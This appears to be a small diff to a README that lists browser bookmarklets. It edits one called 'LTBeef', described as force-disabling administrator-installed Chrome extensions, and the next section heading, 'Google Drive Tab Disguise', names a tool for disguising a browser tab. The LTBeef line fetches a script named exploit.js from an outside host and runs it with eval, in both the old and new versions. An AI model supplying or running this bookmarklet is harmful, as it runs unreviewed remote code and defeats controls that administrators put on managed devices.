@@ -40,7 +40,7 @@
 > ## LTBeef
 #### Force disable admin installed extensions (go to chrome webstore)
 
-`javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});`
+`javascript:fetch('https://compactcow.com/ltbeef/exploit.js').then(data=>{data.text().then(text=>{eval(text)})});`
 
 > ## Google Drive Tab Disguise
 #### Changes icon and title of tab to Google Drives
